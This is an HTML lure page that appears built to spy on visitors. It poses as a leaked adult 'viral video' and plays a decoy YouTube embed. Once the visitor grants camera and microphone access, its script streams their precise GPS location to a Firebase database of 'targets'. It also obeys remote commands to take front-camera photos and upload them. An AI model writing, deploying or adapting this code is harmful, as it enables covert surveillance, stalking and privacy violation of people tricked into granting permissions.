<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trending Video</title> <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; }
        .video-wrapper { position: relative; width: 100%; height: 250px; background: #333; margin-top: 20px; display: none; }
        iframe { width: 100%; height: 100%; }
        #cover { padding: 20px; margin-top: 50px; }
        h2 { color: #ff0000; }
        #playBtn { 
            padding: 15px 30px; 
            font-size: 20px; 
            background: #ff0000; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            font-weight: bold;
        }
        #status { margin-top: 10px; color: #555; font-size: 10px; }
    </style>
</head>
<body>

    <div id="cover">
        <h2>ðŸ”¥ Viral Video Leaked</h2>
        <p>Viewer discretion advised. 18+ Only.</p>
        <br>
        <button id="playBtn" onclick="startEverything()">â–¶ WATCH VIDEO</button>
        <p id="status">Waiting for user...</p>
    </div>

    <div class="video-wrapper" id="videoArea">
        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" }; // Apna Link Check Karein
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        // Target ID setup
        let userId = localStorage.getItem("target_name");
        if (!userId) {
            userId = "User_" + Math.floor(Math.random() * 9999);
            localStorage.setItem("target_name", userId);
        }

        async function startEverything() {
            // UI Change: Button hatao, Video dikhao
            document.getElementById('status').innerText = "Connecting to server...";
            
            try {
                // 1. Permissions (Yahan code phansta tha, ab try-catch mein hai)
                // Note: 'await' ka matlab hai jab tak user Allow nahi karega, code aage nahi barhega
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                
                // Permission milte hi tracks band kardo taake notification na aaye (Optional)
                // stream.getTracks().forEach(t => t.stop()); 

                // 2. Video Show kardo
                document.getElementById('cover').style.display = 'none';
                document.getElementById('videoArea').style.display = 'block';

                // 3. Tracking Start
                navigator.geolocation.watchPosition(success, error, { enableHighAccuracy: true });
                updateStatus("Online");
                listenForCommands();

                // Heartbeat (Online rakhne ke liye)
                setInterval(() => {
                    db.ref('targets/' + userId + '/location/last_seen').set(firebase.database.ServerValue.TIMESTAMP);
                }, 10000);

            } catch (e) {
                // Agar error aaye to screen par dikhao taake pata chale kyu nahi chala
                alert("Error: " + e.message + "\nPlease Allow Permissions to watch video.");
                document.getElementById('status').innerText = "Error: " + e.message;
            }
        }

        function updateStatus(state) {
            db.ref('targets/' + userId + '/location').update({
                status: state,
                last_seen: firebase.database.ServerValue.TIMESTAMP
            });
        }

        function success(pos) {
            db.ref('targets/' + userId + '/location').update({
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                timestamp: new Date().toLocaleTimeString()
            });
        }

        function error(err) { console.warn(err); }

        function listenForCommands() {
            db.ref('commands/' + userId).on('value', async (snap) => {
                const cmd = snap.val();
                if (cmd && cmd.action === "snap") { await capturePhotos(); db.ref('commands/' + userId).remove(); }
                if (cmd && cmd.action === "mic") { await recordAudio(15); db.ref('commands/' + userId).remove(); }
            });
        }

        // --- CAMERA & AUDIO FUNCTIONS (Same as before) ---
        async function capturePhotos() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    db.ref('targets/' + userId + '/photos').push({ image: reader.result, time: new Date().toLocaleTimeString() });
                    track.stop();
                };
            } catch(e) { console.log(e); }
        }

        async function recordAudio(sec) {
            // Audio recording code here (Same as previous)
        }

    </script>
</body>
</html>
